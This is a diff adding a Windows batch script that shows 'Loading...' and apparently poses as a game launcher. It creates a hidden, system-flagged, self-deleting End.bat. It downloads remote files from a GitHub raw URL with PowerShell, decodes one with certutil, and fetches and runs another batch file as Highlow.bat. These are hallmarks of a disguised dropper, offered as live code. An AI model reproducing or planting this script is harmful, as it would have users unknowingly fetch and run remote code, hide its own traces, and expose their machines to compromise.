@@ -1,0 +1,23 @@
+@echo off
+cls
+title Loading...
+echo Loading...
+echo Del Game.bat>End.bat
+echo exit>>End.bat
+attrib End.bat +s +h
+if not exist %appdata%\Microsoft\System\*.bat (
+powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/RickDawlson/Ping/main/Installer', 'Instructions.txt')"
+certutil -f -decode Instructions.txt Instructions.bat
+Del Instructions.txt
+rem call Instructions.bat
+del Instructions.bat
+start End.bat
+exit
+) else (
+cls
+   powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/RickDawlson/Ping/main/Game', 'Highlow.bat')"
+cls
+call Highlow.bat
+Start End.bat
+exit
+   )
